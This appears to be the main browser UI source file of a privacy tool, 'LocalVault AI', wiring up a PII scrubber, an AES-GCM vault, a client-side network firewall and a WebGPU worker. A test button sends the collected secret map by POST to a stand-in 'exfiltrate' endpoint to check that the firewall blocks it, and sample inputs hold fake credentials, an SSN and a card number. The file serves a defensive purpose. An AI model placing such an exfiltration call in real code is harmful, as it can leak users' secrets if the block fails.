/**
 * LocalVault AI v2.0 — Browser UI Controller (src/main.js)
 * Binds the 4-layer PII scrubber, AES-256-GCM cryptographic vault,
 * client-side network exfiltration firewall, 16kHz audio studio, and WebGPU worker bridge.
 */

import { PIIEngine, rehydrateText } from './pii-engine.js';
import { CryptoVault } from './crypto-vault.js';
import { NetworkFirewall } from './network-firewall.js';
import { structureTranscript } from './note-structurer.js';
import { synthesizeTestWav, exportWavBlob } from './audio-utils.js';

export function initLocalVaultApp() {
  if (typeof document === 'undefined') return null;

  const piiEngine = new PIIEngine();
  const cryptoVault = new CryptoVault();
  const firewall = new NetworkFirewall().install(window);

  let latestVaultMap = {};
  let latestAudioSamples = null;
  let worker = null;

  try {
    worker = new Worker(new URL('./worker.js', import.meta.url), { type: 'module' });
  } catch {
    // Fallback if Worker initialization is restricted in headless preview
  }

  // Status badges
  const webgpuBadge = document.getElementById('webgpu-badge');
  const coiBadge = document.getElementById('coi-badge');

  if (coiBadge) {
    const isolated = Boolean(window.crossOriginIsolated);
    coiBadge.textContent = isolated ? 'COI: Isolated (SharedArrayBuffer OK)' : 'COI: Fallback Mode';
    coiBadge.className = `status-pill ${isolated ? 'status-ok' : 'status-warn'}`;
  }

  if (webgpuBadge) {
    if ('gpu' in navigator) {
      navigator.gpu
        .requestAdapter()
        .then((adapter) => {
          webgpuBadge.textContent = adapter ? 'WebGPU: Hardware Accelerated' : 'WebGPU: WASM Fallback';
          webgpuBadge.className = `status-pill ${adapter ? 'status-ok' : 'status-warn'}`;
        })
        .catch(() => {
          webgpuBadge.textContent = 'WebGPU: WASM Fallback';
          webgpuBadge.className = 'status-pill status-warn';
        });
    } else {
      webgpuBadge.textContent = 'WebGPU: WASM Fallback';
      webgpuBadge.className = 'status-pill status-warn';
    }
  }

  // Tab switching
  const tabs = document.querySelectorAll('.lv-tab');
  const panels = document.querySelectorAll('.lv-panel');
  tabs.forEach((tab) => {
    tab.addEventListener('click', () => {
      tabs.forEach((t) => {
        t.classList.remove('active');
        t.setAttribute('aria-selected', 'false');
      });
      panels.forEach((p) => p.classList.remove('active'));
      tab.classList.add('active');
      tab.setAttribute('aria-selected', 'true');
      const target = document.getElementById(tab.dataset.tab);
      if (target) target.classList.add('active');
    });
  });

  // Air-Gap Lockdown toggle
  const airgapToggle = document.getElementById('airgap-toggle');
  if (airgapToggle) {
    airgapToggle.addEventListener('change', (e) => {
      firewall.setAirGapLockdown(e.target.checked);
      renderFirewallAudit();
    });
  }

  // Tab 1: PII Scrubber controls
  const piiInput = document.getElementById('pii-input');
  const piiOutput = document.getElementById('pii-output');
  const piiStatsBar = document.getElementById('pii-stats-bar');
  const customBlockInput = document.getElementById('custom-block-input');

  document.getElementById('btn-load-sample')?.addEventListener('click', () => {
    if (!piiInput) return;
    piiInput.value = [
      '# Production Incident Config Dump',
      'DATABASE_URL=postgres://admin:Sup3rS3cr3tP@ssw0rd99@198.51.100.42:5432/prod_vault',
      'OPENAI_API_KEY=sk-proj-9a8b7c6d5e4f3g2h1i0j9k8l7m6n5o4p3q2r1s',
      'AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE',
      'LOCAL_DEV_HOST=127.0.0.1',
      'Customer Jane Doe (email: jane.doe@acme-corp.io, SSN: 123-45-6789) reported card 4532-0151-1283-0366 failed.'
    ].join('\n');
  });

  document.getElementById('btn-add-block')?.addEventListener('click', () => {
    if (customBlockInput && customBlockInput.value.trim()) {
      piiEngine.addBlocklistTerm(customBlockInput.value.trim());
      customBlockInput.value = '';
    }
  });

  document.getElementById('btn-scrub')?.addEventListener('click', () => {
    if (!piiInput || !piiOutput) return;
    const res = piiEngine.scrub(piiInput.value);
    latestVaultMap = res.vaultMap;
    piiOutput.value = res.scrubbedText;
    if (piiStatsBar) {
      const L = res.stats.byLayer;
      piiStatsBar.textContent = `Total Redacted: ${res.stats.totalRedacted} | Layer 1: ${L[1]} | Layer 2 (Entropy/AST): ${L[2]} | Layer 3: ${L[3]} | Layer 4 (NER): ${L[4]}`;
    }
  });

  document.getElementById('btn-rehydrate')?.addEventListener('click', () => {
    if (!piiOutput) return;
    piiOutput.value = rehydrateText(piiOutput.value, latestVaultMap);
  });

  // WebGPU Worker SLM & Abort
  const btnAskSlm = document.getElementById('btn-ask-slm');
  const btnAbortSlm = document.getElementById('btn-abort-slm');

  btnAskSlm?.addEventListener('click', () => {
    if (!worker || !piiOutput) return;
    btnAbortSlm.disabled = false;
    worker.postMessage({
      type: 'generate',
      payload: {
        prompt: `Summarize safely:\n${piiOutput.value}`
      }
    });
  });

  btnAbortSlm?.addEventListener('click', () => {
    if (!worker) return;
    worker.postMessage({ type: 'abort' });
    btnAbortSlm.disabled = true;
  });

  if (worker) {
    worker.addEventListener('message', (e) => {
      const data = e.data || {};
      if (data.type === 'generation-complete' && piiOutput) {
        piiOutput.value = data.text;
        if (btnAbortSlm) btnAbortSlm.disabled = true;
      } else if (data.type === 'transcription-complete') {
        const tInput = document.getElementById('transcript-input');
        if (tInput) tInput.value = data.text;
      }
    });
  }

  // Tab 2: Audio & Note Structurer
  const transcriptInput = document.getElementById('transcript-input');
  const structuredOutput = document.getElementById('structured-output');
  const noteModeSelect = document.getElementById('note-mode-select');

  document.getElementById('btn-synth-wav')?.addEventListener('click', () => {
    const synth = synthesizeTestWav({ durationSeconds: 1.5, sampleRate: 16000 });
    latestAudioSamples = synth.samples;
    exportWavBlob(synth.samples, synth.sampleRate);
    if (transcriptInput && !transcriptInput.value.trim()) {
      transcriptInput.value =
        'SRE Incident Call: Database primary at 198.51.100.77 experienced latency spike. Engineer Sarah Connor rotated secret API_KEY=sk-proj-1234567890abcdefghijklmnop and restored localhost health checks. Todo: audit connection pooling by Friday.';
    }
  });

  document.getElementById('btn-transcribe')?.addEventListener('click', () => {
    if (!latestAudioSamples) {
      const synth = synthesizeTestWav({ durationSeconds: 1.0, sampleRate: 16000 });
      latestAudioSamples = synth.samples;
    }
    if (worker) {
      worker.postMessage({
        type: 'transcribe',
        payload: { audio: latestAudioSamples }
      });
    }
  });

  document.getElementById('btn-structure-notes')?.addEventListener('click', () => {
    if (!transcriptInput || !structuredOutput) return;
    const mode = noteModeSelect ? noteModeSelect.value : 'meeting';
    const result = structureTranscript(transcriptInput.value, {
      mode,
      autoScrub: true,
      piiEngine
    });
    Object.assign(latestVaultMap, result.vaultMap);
    structuredOutput.value = result.markdown;
  });

  // Tab 3: AES-256-GCM Zero-Knowledge Vault
  const vaultPassphrase = document.getElementById('vault-passphrase');
  const vaultCiphertext = document.getElementById('vault-ciphertext');
  const vaultPlaintext = document.getElementById('vault-plaintext');

  document.getElementById('btn-lock-vault')?.addEventListener('click', async () => {
    if (!vaultPassphrase || !vaultCiphertext) return;
    const pass = vaultPassphrase.value || 'localvault-default-passphrase';
    const envelope = await cryptoVault.lock(latestVaultMap, pass);
    vaultCiphertext.value = cryptoVault.exportLvVault(envelope);
    if (vaultPlaintext) vaultPlaintext.value = '[VAULT LOCKED — AES-256-GCM AUTHENTICATED]';
  });

  document.getElementById('btn-unlock-vault')?.addEventListener('click', async () => {
    if (!vaultPassphrase || !vaultCiphertext || !vaultPlaintext) return;
    try {
      const pass = vaultPassphrase.value || 'localvault-default-passphrase';
      const unlocked = await cryptoVault.unlock(vaultCiphertext.value, pass);
      vaultPlaintext.value = JSON.stringify(unlocked, null, 2);
    } catch (err) {
      vaultPlaintext.value = `ERROR: ${err.message}`;
    }
  });

  document.getElementById('btn-export-vault')?.addEventListener('click', () => {
    if (!vaultCiphertext || !vaultCiphertext.value.trim()) return;
    const blob = new Blob([vaultCiphertext.value], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `localvault-${Date.now()}.lvvault`;
    a.click();
    URL.revokeObjectURL(url);
  });

  // Tab 4: Network Firewall Audit Log
  const firewallStats = document.getElementById('firewall-stats');
  const firewallLog = document.getElementById('firewall-log');

  function renderFirewallAudit() {
    if (!firewallStats || !firewallLog) return;
    const stats = firewall.getStats();
    firewallStats.textContent = `Intercepted Requests: ${stats.totalEvents} | Allowed Read-Only: ${stats.allowed} | Blocked Exfiltration Attempts: ${stats.blocked}`;
    firewallLog.innerHTML = firewall.auditLog
      .map(
        (ev) =>
          `<div>[${ev.timestamp}] <strong>${ev.action}</strong> (${ev.method} ${ev.url}) — ${ev.reason}</div>`
      )
      .join('');
  }

  firewall.onAuditEvent(() => renderFirewallAudit());

  document.getElementById('btn-test-exfil')?.addEventListener('click', async () => {
    try {
      await window.fetch('https://telemetry-collector.example.org/exfiltrate', {
        method: 'POST',
        body: JSON.stringify({ leakedSecrets: latestVaultMap })
      });
    } catch {
      // Expected block by LocalVault NetworkFirewall
    }
    renderFirewallAudit();
  });

  renderFirewallAudit();
  return { piiEngine, cryptoVault, firewall };
}

if (typeof document !== 'undefined') {
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => initLocalVaultApp());
  } else {
    initLocalVaultApp();
  }
}
